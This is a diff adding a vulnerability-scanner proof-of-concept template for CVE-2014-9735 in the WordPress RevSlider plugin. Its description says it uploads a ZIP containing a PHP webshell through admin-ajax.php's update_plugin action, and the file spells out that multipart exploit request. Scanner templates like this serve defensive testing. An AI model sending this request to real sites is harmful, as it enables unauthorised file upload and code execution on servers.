@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "通过向/wp-admin/admin-ajax.php发送特制multipart请求，利用revslider_ajax_action的update_plugin操作上传包含PHP webshell的ZIP文件，然后访问解压后的PHP文件验证代码执行。"
+id = "POC-AVE-2014-0056"
+name = "WordPress RevSlider 任意文件上传执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2014-0056"]
+vuln_id = [
+    "CVE-2014-9735",
+    "AVE-2014-0056",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="action"\r
+\r
+revslider_ajax_action\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="client_action"\r
+\r
+update_plugin\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="update_file"; filename="test.zip"\r
+Content-Type: application/zip\r
+\r
+{{zip_content}}\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryWJDMjlXCUnC1rnZg"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Update in progress"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
